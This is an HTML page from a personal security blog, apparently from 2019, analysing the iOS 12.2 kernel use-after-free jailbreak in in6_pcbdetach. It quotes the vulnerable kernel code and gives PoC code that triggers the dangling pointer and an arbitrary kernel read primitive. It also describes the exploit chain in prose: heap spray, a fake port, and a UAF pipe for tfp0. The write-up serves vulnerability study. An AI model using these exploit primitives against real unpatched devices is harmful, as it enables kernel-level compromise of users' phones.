@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="jailbreak analysis and rewrite on Mac">
+<meta name="keywords" content="漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="iOS12.2 jailbreak analysis">
+<meta property="og:url" content="https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/index.html">
+<meta property="og:site_name" content="Peterpan0927&#39;s Blog">
+<meta property="og:description" content="jailbreak analysis and rewrite on Mac">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006y1smsly1g59nlkvcmbj30l80jojrz.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006y1smsly1g59tuwlkgwj30b207sq35.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006y1smsly1g5ax1hx0bjj31om0note6.jpg">
+<meta property="og:updated_time" content="2019-10-15T04:06:34.187Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="iOS12.2 jailbreak analysis">
+<meta name="twitter:description" content="jailbreak analysis and rewrite on Mac">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/006y1smsly1g59nlkvcmbj30l80jojrz.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/P.png">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>iOS12.2 jailbreak analysis</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+    <link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    <script src="/lib/jquery/jquery.min.js"></script>
+</head>
+
+<body>
+    <div class="banner">
+<div id="blogtitel" class="blogtitel">Peterpan0927&#39;s Blog</div>
+<ul id="wrapper" class="wrapper">
+  <div class="sun">
+    <div class="star"></div>
+  </div>
+  <div class="mercury">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="venus">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="earth">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="mars">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="jupiter">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+</ul>
+</div>
+
+    <div class="background">
+      
+        <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/Peterpan0927">Github</a></li>
+         
+          <li><a href="https://weibo.com/p/1005055999539768?is_all=1">Weibo</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/08/08/Chrome引擎漏洞分析及利用/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/07/08/JavaScript-in-V8/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/&text=iOS12.2 jailbreak analysis"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/&title=iOS12.2 jailbreak analysis"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/&is_video=false&description=iOS12.2 jailbreak analysis"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=iOS12.2 jailbreak analysis&body=Check out this article: https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/&title=iOS12.2 jailbreak analysis"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/&title=iOS12.2 jailbreak analysis"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/&title=iOS12.2 jailbreak analysis"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/&title=iOS12.2 jailbreak analysis"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/&name=iOS12.2 jailbreak analysis&description=&lt;p&gt;jailbreak analysis and rewrite on Mac&lt;/p&gt;"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x0前言"><span class="toc-number">1.</span> <span class="toc-text">0x0前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x1-漏洞"><span class="toc-number">2.</span> <span class="toc-text">0x1.漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x2总体思路"><span class="toc-number">3.</span> <span class="toc-text">0x2总体思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3参考链接"><span class="toc-number">4.</span> <span class="toc-text">0x3参考链接</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+      
+      <div class="content index width mx-auto px2 my4">
+          
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        iOS12.2 jailbreak analysis
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Peterpan0927's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-07-23T02:39:33.000Z" itemprop="datePublished">2019-07-23</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/漏洞/">漏洞</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>jailbreak analysis and rewrite on Mac</p>
+<a id="more"></a>
+<h1 id="0x0前言"><a href="#0x0前言" class="headerlink" title="0x0前言"></a>0x0前言</h1><p>p0的nedwill在同事的帮助下:)完成了<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1806" target="_blank" rel="noopener">iOS12.2越狱</a>，这是一个UAF的洞，是通过<code>tfp0</code>的方式来拿到内核代码执行的权限，了，一般的利用方式我们都还是比较熟悉了，而且UAF的利用方式我们通常都是通过<code>ROP</code>的方式来提权，所以都要配合一个信息泄漏，所以这次的利用方式还是非常值得我们去学习的。通过代码结构来看应该是少不了bazad的帮助，通过他那个软件工程式的<code>exploit</code>就凸显了斯坦福博士的风格。不过整体都是C++下的看的着实有点难受。</p>
+<h1 id="0x1-漏洞"><a href="#0x1-漏洞" class="headerlink" title="0x1.漏洞"></a>0x1.漏洞</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">in6_pcbdetach(struct inpcb *inp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">true<span class="keyword">if</span> (!(so-&gt;so_flags &amp; SOF_PCBCLEARING)) &#123;</span><br><span class="line">truetrue<span class="class"><span class="keyword">struct</span> <span class="title">ip_moptions</span> *<span class="title">imo</span>;</span></span><br><span class="line">truetrue<span class="class"><span class="keyword">struct</span> <span class="title">ip6_moptions</span> *<span class="title">im6o</span>;</span></span><br><span class="line">truetrueinp-&gt;inp_vflag = <span class="number">0</span>;</span><br><span class="line">truetrue<span class="keyword">if</span> (inp-&gt;in6p_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">truetruetruem_freem(inp-&gt;in6p_options);</span><br><span class="line">truetruetrueinp-&gt;in6p_options = <span class="literal">NULL</span>; <span class="comment">// &lt;- good</span></span><br><span class="line">truetrue&#125;</span><br><span class="line">truetrueip6_freepcbopts(inp-&gt;in6p_outputopts); <span class="comment">// &lt;- bad</span></span><br><span class="line">truetrueROUTE_RELEASE(&amp;inp-&gt;in6p_route);</span><br><span class="line">truetrue<span class="comment">// free IPv4 related resources in case of mapped addr</span></span><br><span class="line">truetrue<span class="keyword">if</span> (inp-&gt;inp_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">truetruetrue(<span class="keyword">void</span>) m_free(inp-&gt;inp_options); <span class="comment">// &lt;- good</span></span><br><span class="line">truetruetrueinp-&gt;inp_options = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里在进行资源释放的时候没有把<code>inp-&gt;in6p_outputopts</code>指向空，但是在<code>socket</code>断连再连接的时候就会造成<code>UAF</code>了，我看了一下<code>ip6_freepcbopts</code>这个函数，他将<code>in6p_outputopts</code>中的资源逐个释放并指向空，但很可惜忽略了他的上层。</p>
+<p>我们的poc如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DanglingOptions::DanglingOptions() : dangling_(<span class="literal">false</span>) &#123;</span><br><span class="line">  s_ = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">  <span class="keyword">if</span> (s_ &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"failed to create socket!\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 保证我们释放之后还可以进行setsockopt操作</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">so_np_extensions</span> <span class="title">sonpx</span> = &#123;</span>.npx_flags = SONPX_SETOPTSHUT,</span><br><span class="line">                                   .npx_mask = SONPX_SETOPTSHUT&#125;;</span><br><span class="line">  <span class="keyword">int</span> res = setsockopt(s_, SOL_SOCKET, SO_NP_EXTENSIONS, &amp;sonpx, <span class="keyword">sizeof</span>(sonpx));</span><br><span class="line">  <span class="keyword">if</span> (res != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"failed to enable setsockopt after disconnect!\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> minmtu = <span class="number">-1</span>;</span><br><span class="line">  </span><br><span class="line">  SetMinmtu(&amp;minmtu);</span><br><span class="line">  FreeOptions();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DanglingOptions::FreeOptions</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (dangling_) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  dangling_ = <span class="literal">true</span>;</span><br><span class="line">  <span class="comment">//这个时候in6p_outputopts就已经被我们释放掉了</span></span><br><span class="line">  <span class="keyword">int</span> res = disconnectx(s_, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> res == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="0x2总体思路"><a href="#0x2总体思路" class="headerlink" title="0x2总体思路"></a>0x2总体思路</h1><p>整个利用的总体结构如下：</p>
+<p><img src="https://ws1.sinaimg.cn/large/006y1smsly1g59nlkvcmbj30l80jojrz.jpg" alt></p>
+<p>整体的结构还是比较好理解的，与之前的利用不一样的是，这里提出了几个不一样的技巧：</p>
+<ol>
+<li>fdofiles</li>
+</ol>
+<p>我们知道在一个进程的上下文中应该是会记录了这个进程打开的文件数量，有一个<code>array</code>来记录这些数据，这里正是利用了这一点，来获取管道的内核地址：</p>
+<blockquote>
+<p>task -&gt; proc -&gt; fd table -&gt; open files array (fd_ofiles)</p>
+<p>fd_ofiles -&gt; fileproc -&gt; f_fglob -&gt; fg_data -&gt; pipe -&gt; pipe buffer</p>
+</blockquote>
+<p>其中<code>fake port</code>的管道内核地址是为了构造<code>kernel task</code>，<code>uaf pipe</code>是为了释放掉它的<code>buffer</code>重新填充</p>
+<ol>
+<li>20字节的任意地址读</li>
+</ol>
+<p>首先来看看我们重用的那个对象的结构体：</p>
+<p><img src="https://ws1.sinaimg.cn/large/006y1smsly1g59tuwlkgwj30b207sq35.jpg" alt></p>
+<p>其中<code>pktinfo</code>是一个<code>union</code>，包含了<code>128 bit</code>的ipv6地址和一个4字节的整型<code>index</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in6_pktinfo</span> &#123;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> <span class="title">ipi6_addr</span>;</span>      <span class="comment">/* src/dst IPv6 address */</span></span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>    ipi6_ifindex;   <span class="comment">/* send/recv interface index */</span></span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>
+<p>通过<code>getsockopt</code>中执行的对应<code>option</code>我们可以拿到这20字节的数据，也就是意味着每次我们通过触发UAF，然后将我们想要读取的内核地址数据堆喷上去，然后通过<code>api</code>再读回来。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过控制option name来取不同的属性</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DanglingOptions::GetIPv6Opt</span><span class="params">(<span class="keyword">int</span> option_name, <span class="keyword">void</span> *data, <span class="keyword">socklen_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> res = getsockopt(s_, IPPROTO_IPV6, option_name, data, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> (res != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"GetIpv6Opt got %d\n"</span>, errno);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//buffer是我们堆喷的数据</span></span><br><span class="line"><span class="built_in">memcpy</span>(buffer.get() + OFFSET(ip6_pktopts, ip6po_pktinfo), &amp;address_uint,</span><br><span class="line">         <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>));</span><br></pre></td></tr></table></figure>
+<p>可能不了解总的结构体的话还是会有些模糊：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">ip6_pktopts</span> &#123;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span>  <span class="title">mbuf</span> *<span class="title">ip6po_m</span>;</span>  <span class="comment">/* Pointer to mbuf storing the data */</span></span><br><span class="line">         <span class="keyword">int</span>     ip6po_hlim;     <span class="comment">/* Hoplimit for outgoing packets */</span></span><br><span class="line"> </span><br><span class="line">         <span class="comment">/* Outgoing IF/address information */</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span>  <span class="title">in6_pktinfo</span> *<span class="title">ip6po_pktinfo</span>;</span></span><br><span class="line"> </span><br><span class="line">         <span class="comment">/* Next-hop address information */</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span>  <span class="title">ip6po_nhinfo</span> <span class="title">ip6po_nhinfo</span>;</span></span><br><span class="line"> </span><br><span class="line">         <span class="class"><span class="keyword">struct</span>  <span class="title">ip6_hbh</span> *<span class="title">ip6po_hbh</span>;</span> <span class="comment">/* Hop-by-Hop options header */</span></span><br><span class="line"> </span><br><span class="line">         <span class="comment">/* Destination options header (before a routing header) */</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span>  <span class="title">ip6_dest</span> *<span class="title">ip6po_dest1</span>;</span></span><br><span class="line"> </span><br><span class="line">         <span class="comment">/* Routing header related info. */</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span>  <span class="title">ip6po_rhinfo</span> <span class="title">ip6po_rhinfo</span>;</span></span><br><span class="line"> </span><br><span class="line">         <span class="comment">/* Destination options header (after a routing header) */</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span>  <span class="title">ip6_dest</span> *<span class="title">ip6po_dest2</span>;</span></span><br><span class="line"> </span><br><span class="line">         <span class="keyword">int</span>     ip6po_tclass;   <span class="comment">/* traffic class */</span></span><br><span class="line"> <span class="comment">//获取port的内核地址就是用了这个属性，minmtu取到高32位，prefer_tempaddr取到低32位（小端模式），通过((uint64_t)minmtu &lt;&lt; 32) | prefer_tempaddr 操作最后算出地址</span></span><br><span class="line">         <span class="keyword">int</span>     ip6po_minmtu;  <span class="comment">/* fragment vs PMTU discovery policy */</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">         <span class="keyword">int</span>     ip6po_prefer_tempaddr;  <span class="comment">/* whether temporary addresses are</span></span><br><span class="line"><span class="comment">                                            preferred as source address */</span></span><br><span class="line"> </span><br><span class="line">         <span class="keyword">int</span> ip6po_flags;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>
+<p>任意地址读相当于是用我们想要读取的数据覆盖<code>ip6po_pktinfo</code>指针，所以在取的时候会对这个指针的值解引用然后读取20字节的数据回来。这个做法很精妙但是不通用，只是针对于这个结构体而言的。</p>
+<ol>
+<li>uaf_pipe</li>
+</ol>
+<p>我们虽然构造了一个<code>fake port</code>但是苦于没有一个合法的<code>port name</code>进行操纵，所以就算我们把<code>kernel task</code>全都<code>dump</code>到了我们的<code>fake task</code>，也没办法进行任意地址读写，这里提出了一个新的<code>UAF pipe</code>，创建之后我们先通过任意地址读拿到它的内核地址信息，然后将它的<code>buffer</code>给释放掉，注意这里释放的只是<code>buffer</code>，而不是<code>pipe</code>。</p>
+<p>再通过堆喷大量的<code>ool ports</code>占据这块<code>buffer</code>，那么这个时候<code>buffer</code>中应该包含着刚刚堆喷的<code>port</code>的内核地址，最后将<code>uaf pipe</code>的首8个字节改写为<code>fake port</code>的地址，这就相当于我们拥有了一个可以操控<code>fake port</code>的<code>port name</code>了，最后我们接受消息，判断<code>port name</code>是否合法，如果合法说明我们已经拥有了最后的内核地址读写的权限了。</p>
+<ol>
+<li>heap spray</li>
+</ol>
+<p>我们知道做堆喷是有多种方式的，这里选择每一种都是有原因的，<code>ool ports</code>是为了<code>port name</code>，<code>IOSurface</code>是因为用起来很舒服，比较自由 ，所以除非是为了<code>fake port</code>，我们用的都是<code>IOSurface</code>的<code>set_value</code>。</p>
+<p>最后我对于C++写的实在有点难受，另外好久也没写利用了，有点手生，所以在Mac上用C写了一下：</p>
+<p><img src="https://ws1.sinaimg.cn/large/006y1smsly1g5ax1hx0bjj31om0note6.jpg" alt></p>
+<h1 id="0x3参考链接"><a href="#0x3参考链接" class="headerlink" title="0x3参考链接"></a>0x3参考链接</h1><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1806" target="_blank" rel="noopener">bugs.chromium</a></p>
+
+  </div>
+</article>
+
+
+
+      </div>
+      
+       <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/Peterpan0927">Github</a></li>
+         
+          <li><a href="https://weibo.com/p/1005055999539768?is_all=1">Weibo</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x0前言"><span class="toc-number">1.</span> <span class="toc-text">0x0前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x1-漏洞"><span class="toc-number">2.</span> <span class="toc-text">0x1.漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x2总体思路"><span class="toc-number">3.</span> <span class="toc-text">0x2总体思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3参考链接"><span class="toc-number">4.</span> <span class="toc-text">0x3参考链接</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/&text=iOS12.2 jailbreak analysis"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/&title=iOS12.2 jailbreak analysis"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/&is_video=false&description=iOS12.2 jailbreak analysis"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=iOS12.2 jailbreak analysis&body=Check out this article: https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/&title=iOS12.2 jailbreak analysis"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/&title=iOS12.2 jailbreak analysis"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/&title=iOS12.2 jailbreak analysis"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/&title=iOS12.2 jailbreak analysis"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://peterpan0927.github.io/2019/07/23/iOS12-2越狱漏洞分析/&name=iOS12.2 jailbreak analysis&description=&lt;p&gt;jailbreak analysis and rewrite on Mac&lt;/p&gt;"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+      
+      <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2023 Peterpan0927
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/Peterpan0927">Github</a></li>
+         
+          <li><a href="https://weibo.com/p/1005055999539768?is_all=1">Weibo</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+      <script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
+    </div>
+</body>
+</html>
